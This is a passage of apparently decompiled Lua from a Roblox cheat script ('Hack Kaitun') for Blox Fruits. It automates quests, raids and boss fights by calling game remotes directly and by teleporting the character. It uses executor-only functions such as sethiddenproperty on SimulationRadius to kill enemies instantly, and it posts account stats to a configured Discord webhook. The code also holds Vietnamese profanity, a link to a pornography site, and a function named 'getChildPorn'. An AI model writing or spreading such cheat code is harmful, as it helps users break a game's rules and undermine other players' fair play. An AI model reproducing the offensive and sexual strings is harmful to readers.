                local _ = game:GetService("Players").LocalPlayer:FindFirstChild("Data").DevilFruit.Value
                local v630, v631, v632 = pairs(game.Players.LocalPlayer.Character:GetChildren())
                while true do
                    local v633
                    v632, v633 = v630(v631, v632)
                    if v632 == nil then
                        break
                    end
                    if string.find(v633.Name, "Fruit") then
                        local v634 = v633.Name
                        local v635, v636, v637 = pairs(vu21)
                        while true do
                            local v638
                            v637, v638 = v635(v636, v637)
                            if v637 == nil then
                                break
                            end
                            if string.find(string.lower(v638), string.gsub(string.lower(v634), " fruit", "")) then
                                if raidfruit and (v634 == raidfruit or string.find(v634, raidfruit)) then
                                    return
                                end
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", v638, v633)
                                if v633 and checkNotify("You can only store") then
                                    if v633 and (v633.Name and game.Players.LocalPlayer.Data.DevilFruit.Value) and (getFruitTier(v633.Name or v634) >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"]) then
                                        noti("Eat Fruit")
                                        eatfruit(v633.Name)
                                    elseif c().Fruit["Auto Raid While Cant Store"] and (getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and (getPlayerLevel() > 1100 and not CheckSea(1))) then
                                        AutoRaid = true
                                        PullFruit = false
                                    else
                                        noti("Shit")
                                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                                    end
                                    return
                                end
                                noti("stored")
                            end
                        end
                    end
                end
            end
        end
        function set(p639)
            TextLabel.Text = tostring(p639)
            m1 = p639
        end
        function set1(p640)
            TextLabel1.Text = tostring(p640)
            m2 = p640
        end
        function cdkstuff1()
            if not checkMelee("Godhuman") or (eltrul.Godhuman <= 399 or checkitem("Cursed Dual Katana")) then
                return
            end
            local v641 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "Progress")
            local v642, _ = checkitem("Yama")
            local v643, _ = checkitem("Tushita")
            if not v642 or v642.Mastery <= 350 then
                forcewp = "Sword"
                set1("Waiting For  Yama")
                if not checkitem2("Yama") and checkitem("Yama") then
                    set1("Waiting For Yama Hit 300 Mastery")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                        "LoadItem",
                        "Yama"
                    }))
                end
            end
            if not v643 or v643.Mastery <= 350 then
            end
            if v641.Good == - 1 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
                pcall(to(getmon("Mythological Pirate [Lv. 1850]").HumanoidRootPart.CFrame) or getMobLoadPos("Mythological Pirate").CFrame)
                return true
            end
            if v641.Evil == - 1 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
                local v644, v645, v646 = pairs(workspace.NPCs:GetChildren())
                while true do
                    local v647
                    v646, v647 = v644(v645, v646)
                    if v646 == nil then
                        break
                    end
                    if v647.Name == "Luxury Boat Dealer" then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "BoatQuest", v647)
                    end
                end
                return true
            end
            if v641.Evil == 0 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
                local v648, v649, v650 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local vu651
                    v650, vu651 = v648(v649, v650)
                    if v650 == nil then
                        break
                    end
                    if vu651:FindFirstChild("HazeESP") then
                        BringMob(vu651)
                        click = true
                        repeat
                            wait()
                            pcall(function()
                                to(vu651.HumanoidRootPart.CFrame * CFrame.new(5, 35, 8))
                                stuff(vu651)
                            end)
                        until not skidymf(vu651)
                        click = false
                    end
                end
                return true
            end
            if v641.Good == 0 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
                return false
            end
            if v641.Evil ~= 1 then
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
            if not CheckBoss("Soul Reaper [Lv. 2100] [Raid Boss]") then
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil")
            local v652 = CheckBoss("Soul Reaper [Lv. 2100] [Raid Boss]")
            repeat
                wait()
                to(v652.HumanoidRootPart.CFrame)
            until game:GetService("Workspace").Map:FindFirstChild("HellDimension")
            wait(2)
            local v653, v654, v655 = pairs(game:GetService("Workspace").Map.HellDimension:GetChildren())
            while true do
                local v656, v657 = v653(v654, v655)
                if v656 == nil then
                    while true do
                        wait()
                        local v658, v659, v660 = pairs(getsortedmon())
                        while true do
                            local vu661
                            v660, vu661 = v658(v659, v660)
                            if v660 == nil then
                                break
                            end
                            pcall(function()
                                if string.find(vu661.Name, "Cursed Skeleton") or string.find(vu661.Name, "Hell") then
                                    vu661.HumanoidRootPart.CanCollide = false
                                    sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                    vu661.Humanoid.Health = 0
                                    vu661:BreakJoints()
                                end
                            end)
                        end
                        if not game.Workspace.Enemies:FindFirstChild("Hell\'s Messenger [Lv. 2200] [Boss]") then
                            wait(0.2)
                            to(game:GetService("Workspace").Map.HellDimension.Exit.CFrame)
                        end
                    end
                end
                v655 = v656
                if string.find(v657.Name, "Torch") and (v657:FindFirstChild("ProximityPrompt") and v657.ProximityPrompt.Enabled == true) then
                    if true then
                        wait()
                        if (v657.Position - plr.Character.HumanoidRootPart.Position).Magnitude > 5 then
                            to(v657.CFrame)
                        else
                            fireproximityprompt(v657.ProximityPrompt)
                        end
                    end
                    if not game:GetService("Workspace").Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") and v657.ProximityPrompt.Enabled ~= false then
                    end
                end
            end
            if v641.Good ~= 1 then
                if v642.Mastery > 350 and (not CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]") and c().Process["Hop For Rip Indra"]) then
                    hophophop = true
                    return
                end
                set1("Waiting For Tushita")
                if not checkitem2("Tushita") and checkitem("Tushita") then
                    set1("Waiting For Tushita Hit 300 Mastery")
                    forcewp = "Sword"
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                        "LoadItem",
                        "Tushita"
                    }))
                end
            end
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good")
            if not CheckBoss("Cake Queen [Lv. 2175] [Boss]") then
                if CheckMaterialCount("Alucard Fragment") == 6 then
                    return {
                        0,
                        0,
                        "Done"
                    }
                end
            end
            local vu662 = CheckBoss("Cake Queen [Lv. 2175] [Boss]")
            repeat
                wait()
                pcall(function()
                    to(getKillVector3(vu662.HumanoidRootPart.CFrame))
                    stuff()
                    click = true
                end)
            until not skidymf(vu662) or game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension")
            wait(2)
            local v663, v664, v665 = pairs(game:GetService("Workspace").Map:FindFirstChild("HeavenlyDimension"))
            if true then
                wait()
                if (v3.Position - plr.Character.HumanoidRootPart.Position).Magnitude > 5 then
                    to(v3.CFrame)
                else
                    fireproximityprompt(v3.ProximityPrompt)
                end
            end
            if not game:GetService("Workspace").Enemies:FindFirstChild("Heaven\'s Guardian [Lv. 2200] [Boss]") and v3.ProximityPrompt.Enabled ~= false then
            end
            wait()
            local v666, v667, v668 = pairs(getsortedmon())
            while true do
                local vu669
                v668, vu669 = v666(v667, v668)
                if v668 == nil then
                    break
                end
                pcall(function()
                    if string.find(vu669.Name, "Cursed Skeleton") or string.find(vu669.Name, "Heaven") then
                        vu669.HumanoidRootPart.CanCollide = false
                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                        vu669.Humanoid.Health = 0
                        vu669:BreakJoints()
                    end
                end)
            end
            if game.Workspace.Enemies:FindFirstChild("Heaven\'s Guardian [Lv. 2200] [Boss]") then
            end
            wait(0.2)
            to(game:GetService("Workspace").Map.HeavenlyDimension.Exit.CFrame)
            local v670, _ = v663(v664, v665)
            if v670 == nil then
            end
            v665 = v670
            if string.find(v3.Name, "Torch") and (v3:FindFirstChild("ProximityPrompt") and v3.ProximityPrompt.Enabled == true) then
            else
            end
        end
        task.spawn(function()
            RedeemAllCodesX2()
        end)
        function noti2(p671)
            if p671 ~= oldmsg then
                WeaponMsg = p671
                oldmsg = p671
            end
        end
        function noti(p672, p673)
            vu11({
                Description = p672,
                Title = "Genshin \226\128\162 Notifications",
                Duration = p673 or 5
            })
        end
        function getElite()
            local v674, v675, v676 = pairs(getsortedmon())
            while true do
                local v677
                v676, v677 = v674(v675, v676)
                if v676 == nil then
                    break
                end
                if skidymf(v677) and table.find(elite, v677.Name) then
                    return v677
                end
            end
            local v678, v679, v680 = pairs(game.ReplicatedStorage:GetChildren())
            while true do
                local v681
                v680, v681 = v678(v679, v680)
                if v680 == nil then
                    break
                end
                if skidymf(v681) and table.find(elite, v681.Name) then
                    return v681
                end
            end
        end
        eltrul = {}
        allmelee = " > "
        local v682, v683, v684 = pairs(meleetable2)
        local vu685 = vu423
        local vu686 = {}
        while true do
            local vu687
            v684, vu687 = v682(v683, v684)
            if v684 == nil then
                break
            end
            local vu688 = GetAndCheckMeleeMastery(vu687)
            eltrul[vu687] = vu688 or 0
            print(v684, vu687, vu688)
            allmelee = allmelee .. " " .. tostring(vu687) .. "(" .. tostring(GetAndCheckMeleeMastery(vu687)) .. ")"
            pcall(function()
                if vu688 ~= 0 then
                    vclui[vu687]:SetText("[+] : " .. vu687)
                end
            end)
        end
        CFrameQuest()
        wait()
        PullFruit = false
        delaychecktime = 0
        function checkdelay(_, _)
            delaychecktime = delaychecktime + 1
            delaytime = tick()
        end
        function AwakeFruit()
            local v689 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")
            if v689 and (v689 ~= 0 and v689 ~= 1) then
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
            end
        end
        function getAwakeningSkills()
            local v690 = ""
            if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then
                return "This Fruit Cant Awaken"
            end
            local v691, v692, v693 = pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities"))
            while true do
                local v694
                v693, v694 = v691(v692, v693)
                if v693 == nil then
                    break
                end
                v690 = v690 .. " [" .. v693 .. "]: " .. tostring(v694.Awakened) .. ", "
            end
            return v690
        end
        function getAwakeningSkills2()
            if not game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") then
                return {
                    ["This Fruit Cant Awaken"] = false
                }
            end
            local v695, v696, v697 = pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities"))
            local v698 = {}
            while true do
                local v699
                v697, v699 = v695(v696, v697)
                if v697 == nil then
                    break
                end
                v698[tostring(v697)] = v699.Awakened or false
            end
            return v698
        end
        function getChildPorn()
            local v700, v701, v702 = pairs(inv)
            local v703 = {}
            while true do
                local v704
                v702, v704 = v700(v701, v702)
                if v702 == nil then
                    break
                end
                if tonumber(v704.Rarity) > 2 then
                    table.insert(v703, v704.Name)
                end
            end
            return v703
        end
        noti("Loaded (" .. math.floor(tick() - tickcac) .. "ms delay)")
        if c().Misc.Webhook.Enable then
            warn("ok")
            spawn(function()
                fe = true
                while fe and wait() or task.wait(c().Misc.Webhook["Send While"].Delay) do
                    fe = false
                    if c().Misc.Webhook["Send While"]["Account Status"] then
                        noti("Post Account Status To Webhook...")
                        warn("post")
                        local v705, v706, v707 = pairs(inv)
                        local v708 = {
                            Sword = " > ",
                            Gun = " > ",
                            Wear = " > ",
                            ["Blox Fruit"] = " > ",
                            Material = " > ",
                            Other = " > "
                        }
                        while true do
                            local v709
                            v707, v709 = v705(v706, v707)
                            if v707 == nil then
                                break
                            end
                            v709.Type = v709.Type or "Other"
                            print(v709.Type)
                            if string.len(v708[v709.Type]) <= 1000 then
                                v708[v709.Type] = tostring(v708[v709.Type] .. v709.Name .. "(" .. (v709.Mastery or (v709.Count or "?")) .. ")(" .. tostring(rarity[v709.Rarity] or "null") .. ") ")
                            else
                                v708[v709.Type] = tostring(v708[v709.Type] .. "...")
                            end
                        end
                        allmelee = " > "
                        local v710, v711, v712 = pairs(eltrul)
                        while true do
                            local v713
                            v712, v713 = v710(v711, v712)
                            if v712 == nil then
                                break
                            end
                            if v713 > 0 then
                                allmelee = allmelee .. " " .. tostring(v712) .. "(" .. tostring(v713) .. "),"
                            end
                        end
                        ditmemememememmeme = {}
                        local v714 = ditmemememememmeme
                        local v715 = {}
                        local v716 = {
                            title = "Cai Dit Con Me May Beo",
                            url = "https://thumbzilla.com/",
                            description = "Dit Me May Ong",
                            color = 14177041,
                            image = {
                                url = c().Misc.Webhook.Image[math.random(1, # c().Misc.Webhook.Image)]
                            },
                            author = {
                                name = "Con me may di",
                                icon_url = "https://e7.pngegg.com/pngimages/128/635/png-clipart-sakura-tree-cherry-blossom-cherry-branch-color-thumbnail.png"
                            },
                            fields = {
                                {
                                    name = "General",
                                    value = tostring("```Name: " .. game.Players.LocalPlayer.Name .. "\nLevel: " .. getPlayerLevel() .. "\nBeli: " .. getPlayerBeli() .. "\nFragments: " .. getPlayerFragments() .. "\nRace: " .. whatismyrace() .. "\nDevil Fruit: " .. tostring(NameDf()) .. "```"),
                                    inline = true
                                },
                                {
                                    name = "Melee",
                                    value = "```" .. tostring(allmelee or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Awakening Skills",
                                    value = "```" .. tostring(getAwakeningSkills()) .. "```",
                                    inline = true
                                },
                                {
                                    name = "Sword",
                                    value = "```" .. tostring(v708.Sword or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Gun",
                                    value = "```" .. tostring(v708.Gun or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Accessory",
                                    value = "```" .. tostring(v708.Wear or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Fruit",
                                    value = "```" .. tostring(v708["Blox Fruit"] or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Material",
                                    value = "```" .. tostring(v708.Material or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Others",
                                    value = "```" .. tostring(v708.Other or "Error") .. "```",
                                    inline = true
                                },
                                {
                                    name = "Unlocked",
                                    value = "```" .. tostring("Race V2: " .. tostring(moctui(2)) .. "\nRace V3: " .. tostring(moctui(3)) .. "\nBartilo: " .. tostring(BartiloProgress == 3) .. "\nSwan: " .. tostring(uable.FlamingoAccess or false)) .. "```",
                                    inline = true
                                },
                                {
                                    name = "Script Status",
                                    value = "```" .. (m1 or "none") .. "\n " .. (m2 or "none") .. "```",
                                    inline = true
                                }
                            },
                            footer = {
                                text = "B\225\186\163n Hack Kaitun D\195\160nh Cho M\225\186\165y Th\225\186\177ng C\225\187\165t Tay / " .. disp_time(esltime) or ""
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }
                        __set_list(v715, 1, {
                            v716
                        })
                        v714.embeds = v715
                        PostWebhook(c().Misc.Webhook.Url, ditmemememememmeme)
                    end
                end
            end)
        end
        spawn(function()
            while task.wait(0.1) do
                pcall(function()
                    textframefffff.Text = "Hold P To Remove Black Screen \n Player Level: " .. getPlayerLevel()
                    if game.Players.LocalPlayer.Character.Humanoid.Sit then
                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    end
                end)
                pcall(function()
                    if c().Process["Auto Buy 3 Legendary Sword"] then
                        local v717 = {
                            "LegendarySwordDealer",
                            tostring(math.random(1, 3))
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(v717))
                    end
                    if c().Process["Auto Buy Haki Color"] then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                            "ColorsDealer",
                            "2"
                        }))
                    end
                end)
                pcall(function()
                    aD = CheckIsRaiding()
                end)
                pcall(function()
                    cockboss = CheckSea(3) and CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2])
                end)
                pcall(function()
                    bA = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                end)
                pcall(function()
                    specb = getSpeficalBoss()
                end)
                pcall(function()
                    local v718 = CheckSea(3)
                    if v718 then
                        if checkitem("Tushita") then
                            v718 = false
                        else
                            v718 = CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]")
                        end
                    end
                    tushitareq = v718
                end)
                pcall(function()
                    local v719 = CheckSea(3)
                    if v719 then
                        if checkitem("Yama") then
                            v719 = false
                        else
                            v719 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter", "Progress") >= 30
                        end
                    end
                    checkyamareq = v719
                end)
                pcall(function()
                    local v720 = CheckSea(3)
                    if v720 then
                        if checkitem("Buddy Sword") then
                            v720 = false
                        else
                            v720 = CheckBoss("Cake Queen [Lv. 2175] [Boss]")
                        end
                    end
                    buddyreq = v720
                end)
                pcall(function()
                    local v721 = CheckSea(3) and CheckBoss("Beautiful Pirate [Lv. 1950] [Boss]")
                    if v721 then
                        v721 = not checkitem("Canvander")
                    end
                    Canvanderreq = v721
                end)
                pcall(function()
                    local v722 = CheckSea(3)
                    if v722 then
                        v722 = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan", "Bet") == nil
                    end
                    hakicol = v722
                end)
                pcall(function()
                    ispirateraid = getMobPirateRaid()
                end)
                pcall(function()
                    local v723 = CheckSea(3)
                    if v723 then
                        if checkitem("Tushita") or game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") then
                            v723 = false
                        else
                            v723 = CheckBoss("Longma [Lv. 2000] [Boss]")
                        end
                    end
                    tushitareq2 = v723
                end)
                pcall(function()
                    local v724 = CheckSea(2) and checkitem("Library Key") and game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild("PhoeyuDoor")
                    if v724 then
                        v724 = game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0
                    end
                    librarydoor = v724
                end)
                pcall(function()
                    local v725 = CheckSea(2) and checkitem("Hidden Key")
                    if v725 then
                        v725 = not checkitem("Rengoku")
                    end
                    rengokustat = v725
                end)
                pcall(function()
                    local v726 = CheckSea(2)
                    if v726 then
                        v726 = getmon("Core") or CheckBoss("Core")
                    end
                    factoryexists = v726
                end)
                pcall(function()
                    BartiloProgress = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo")
                end)
                pcall(function()
                    zqp = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress", "Check")
                end)
                pcall(function()
                    uable = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables")
                    uable = uable or {}
                end)
                pcall(function()
                    local v727 = CheckSea(2)
                    if v727 then
                        if cls_7 then
                            v727 = false
                        else
                            v727 = CheckBoss("Tide Keeper [Lv. 1475] [Boss]")
                        end
                    end
                    waterkeystuff = v727
                end)
                pcall(function()
                    local v728 = CheckSea(2)
                    if v728 then
                        if checkitem("Rengoku") then
                            v728 = game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild("PhoeyuDoor")
                            if v728 then
                                if game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor:FindFirstChild("PhoeyuDoor").Transparency ~= 0 then
                                    v728 = false
                                end
                            end
                        else
                            v728 = CheckBoss("Awakened Ice Admiral [Lv. 1400] [Boss]")
                        end
                    end
                    rengokustat3 = v728
                end)
                pcall(function()
                    cls_1 = (not CheckSea(1) and (aD or AutoRaid) and true or false) and (game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectRaid or getraidchip()) == 1 or PullFruit and loadfruit(getRaidFruit()) and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectRaid or getraidchip()) == 1 or CheckIsRaiding()) or checkitem("Special Microchip")
                end)
                spawn(function()
                    local v729 = CheckSea(3) and checkitem("Red Key")
                    if v729 then
                        v729 = game:GetService("Workspace").Map.CakeLoaf:FindFirstChild("RedDoor")
                    end
                    cls_2 = v729
                end)
                pcall(function()
                    cls_3 = checkitem("Hallow Essence")
                end)
                pcall(function()
                    local v730 = CheckSea(2) and (getPlayerLevel() > 849 and BartiloProgress and (BartiloProgress ~= 3 and deobietsettengi()))
                    if v730 then
                        v730 = c().Process.Bartilo
                    end
                    cls_4 = v730
                end)
                pcall(function()
                    cls_5 = getElite()
                end)
                pcall(function()
                    local v731 = workspace:FindFirstChild("Flower2")
                    if v731 then
                        if workspace.Flower2.Transparency == 1 then
                            v731 = false
                        else
                            v731 = not checkitem("Flower 2")
                        end
                    end
                    cls_6 = v731
                end)
                pcall(function()
                    cls_7 = CheckWaterKey()
                end)
            end
        end)
        spawn(function()
            while task.wait() do
                oti = tick()
                oldtimetime = os.time()
                local v847, v848 = xpcall(function()
                    spawn(function()
                        pcall(function()
                            if CheckMaterialCount("Bone") > 50 then
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                            end
                        end)
                        reach = os.time()
                        updatetime()
                    end)
                    delaytime = tick()
                    if getgenv().ForceStop then
                        return
                    end
                    if cls_1 then
                        set("Raiding")
                        noti("Raid")
                        if CheckIsRaiding() then
                            rson = "Continue Raid"
                        end
                        if AutoRaid then
                            rson = "Request Raid"
                        end
                        if CheckIsRaiding() then
                            AutoRaid = false
                            PullFruit = false
                            repeat
                                wait()
                                pcall(function()
                                    local v732, v733, v734 = pairs(getsortedmon())
                                    while true do
                                        local v735
                                        v734, v735 = v732(v733, v734)
                                        if v734 == nil then
                                            break
                                        end
                                        to(getNextIsland().CFrame * CFrame.new(math.random(0, 50), 100, math.random(0, 50)))
                                        v735.HumanoidRootPart.CanCollide = false
                                        sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                        v735.Humanoid.Health = 0
                                        v735:BreakJoints()
                                    end
                                end)
                            until not CheckIsRaiding()
                        else
                            if CheckSea(3) then
                                fireclickdetector(Workspace.Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                            elseif CheckSea(2) then
                                fireclickdetector(Workspace.Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                            else
                                vu685:Kick("Bro What?")
                            end
                            check179 = os.time()
                            repeat
                                wait()
                                pcall(function()
                                    sexroblox:Cancel()
                                end)
                                to(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
                                print("?")
                            until checkNotify("GO") or (not game.Players.LocalPlayer.Character:FindFirstChild("Head") or os.time() - check179 > 10)
                        end
                        AwakeFruit()
                    end
                    if cls_2 then
                        EquipWeaponName("Red Key")
                        to(CFrame.new(- 2681.97998, 64.3921585, - 12853.7363, 0.149007782, - 1.87902192e-8, 0.98883605, 3.60619588e-8, 1, 1.35681812e-8, - 0.98883605, 3.36376011e-8, 0.149007782))
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                            "CakeScientist",
                            "Check"
                        }))
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                            "RaidsNpc",
                            "Check"
                        }))
                    end
                    if CheckSea(3) and cockboss then
                        local vu736 = CheckBoss(DoughBoss[1]) or CheckBoss(DoughBoss[2])
                        click = true
                        repeat
                            wait()
                            pcall(function()
                                to(vu736.HumanoidRootPart.CFrame * CFrame.new(5, 35, 8))
                                stuff(vu736)
                            end)
                        until not skidymf(vu736)
                        click = false
                    end
                    if CheckSea(3) and bA == 4 then
                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start")
                        wait()
                        request(Vector3.new(- 12463.8740234375, 374.9144592285156, - 7523.77392578125))
                    end
                    if cls_3 then
                        to(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
                    end
                    if CheckSea(3) and CheckBoss("Soul Reaper [Lv. 2100] [Raid Boss]") then
                        local vu737 = CheckBoss("Soul Reaper [Lv. 2100] [Raid Boss]")
                        set("Feeding " .. vu737.Name .. " [Hallow Scythe]")
                        repeat
                            wait()
                            pcall(function()
                                to(vu737.HumanoidRootPart.CFrame * CFrame.new(3, 40, 7))
                                click = true
                                stuff(vu737)
                            end)
                        until not skidymf(vu737)
                    end
                    if CheckSea(3) and buddyreq then
                        local vu738 = CheckBoss("Cake Queen [Lv. 2175] [Boss]")
                        set("Feeding " .. vu738.Name .. " [Buddy Sword]")
                        repeat
                            wait()
                            pcall(function()
                                to(getKillVector3(vu738.HumanoidRootPart.CFrame))
                                click = true
                                stuff(vu738)
                            end)
                        until not skidymf(vu738)
                    end
                    if CheckSea(3) and checkyamareq then
                        set("Get Yama")
                        repeat
                            wait()
                            fireclickdetector(game:GetService("Workspace").Map.Waterfall.SealedKatana.Handle.ClickDetector)
                        until checkitem("Yama")
                    end
                    if CheckSea(3) and tushitareq then
                        set("Doing Holy Torch Quest")
                        if EquipWeaponName("Holy Torch") then
                            repeat
                                wait()
                                to(CFrame.new(- 10752.7695, 412.229523, - 9366.36328))
                                wait(0.2)
                                to(CFrame.new(- 11673.4111, 331.749023, - 9474.34668))
                                wait(0.2)
                                to(CFrame.new(- 12133.3389, 519.47522, - 10653.1904))
                                wait(0.2)
                                to(CFrame.new(- 13336.5, 485.280396, - 6983.35254, 0.912677109))
                                wait(0.2)
                                to(CFrame.new(- 13487.4131, 334.8484, - 7926.34863))
                                wait(0.4)
                            until not checkitem("Holy Torch")
                        else
                            to(CFrame.new(- 10752, 417, - 9366))
                        end
                    end
                    if specb then
                        if CheckIsRaiding() then
                            game.Players.LocalPlayer.Character.Humanoid.Health = - 2
                        else
                            local vu739 = getSpeficalBoss()
                            set("Farming Boss: " .. vu739.Name)
                            if vu739 then
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(vu739.HumanoidRootPart.CFrame))
                                        stuff(vu739)
                                        click = true
                                    end)
                                until not skidymf(vu739)
                            end
                        end
                    end
                    if CheckSea(3) and tushitareq2 then
                        local vu740 = CheckBoss("Longma [Lv. 2000] [Boss]")
                        set("Farming " .. vu740.Name .. " [Tushita]")
                        repeat
                            wait()
                            pcall(function()
                                to(getKillVector3(vu740.HumanoidRootPart.CFrame))
                                stuff(vu740)
                                click = true
                            end)
                        until not skidymf(vu740)
                        click = false
                    end
                    if CheckSea(3) and ispirateraid then
                        check180 = os.time()
                        while true do
                            wait()
                            local vu741 = getMobPirateRaid()
                            set("Pirate Raid")
                            repeat
                                wait()
                                pcall(function()
                                    to(getKillVector3(vu741.HumanoidRootPart.CFrame))
                                    stuff()
                                    click = true
                                end)
                            until not skidymf(vu741)
                            click = false
                            if checkNotify("job") or os.time() - check180 > 200 then
                            end
                        end
                    end
                    if CheckSea(3) and hakicol then
                        set("Doing Rainbow Haki Quest")
                        if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible then
                            if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone") then
                                if not CheckBoss("Stone [Lv. 1550] [Boss]") then
                                    HopServer()
                                    wait(9999)
                                end
                                local vu742 = CheckBoss("Stone [Lv. 1550] [Boss]")
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(vu742.HumanoidRootPart.CFrame))
                                        click = true
                                        stuff()
                                    end)
                                until not skidymf(vu742)
                                click = false
                            end
                            if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Empress") then
                                if not CheckBoss("Island Empress [Lv. 1675] [Boss]") then
                                    HopServer()
                                    wait(9999)
                                end
                                eltrulngu = CheckBoss("Island Empress [Lv. 1675] [Boss]")
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                                        click = true
                                        stuff()
                                    end)
                                until not skidymf(eltrulngu)
                                click = false
                            end
                            if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo") then
                                if not CheckBoss("Kilo Admiral [Lv. 1750] [Boss]") then
                                    HopServer()
                                    wait(9999)
                                end
                                eltrulngu = CheckBoss("Kilo Admiral [Lv. 1750] [Boss]")
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                                        click = true
                                        stuff()
                                    end)
                                until not skidymf(eltrulngu)
                                click = false
                            end
                            if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Elephant") then
                                if not CheckBoss("Captain Elephant [Lv. 1875] [Boss]") then
                                    HopServer()
                                    wait(9999)
                                end
                                eltrulngu = CheckBoss("Captain Elephant [Lv. 1875] [Boss]")
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                                        click = true
                                        stuff()
                                    end)
                                until not skidymf(eltrulngu)
                                click = false
                            end
                            if string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful") then
                                if not CheckBoss("Beautiful Pirate [Lv. 1950] [Boss]") then
                                    noti("Hop For Beautiful Pirate")
                                    HopServer()
                                    wait(9999)
                                end
                                eltrulngu = CheckBoss("Beautiful Pirate [Lv. 1950] [Boss]")
                                repeat
                                    wait()
                                    pcall(function()
                                        to(getKillVector3(eltrulngu.HumanoidRootPart.CFrame))
                                        click = true
                                        stuff()
                                    end)
                                until not skidymf(eltrulngu)
                                click = false
                            end
                        else
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                        end
                    end
                    if CheckSea(3) and cls_5 then
                        eltrulngungungu = getElite()
                        set("Farming Elite: " .. eltrulngungungu.Name)
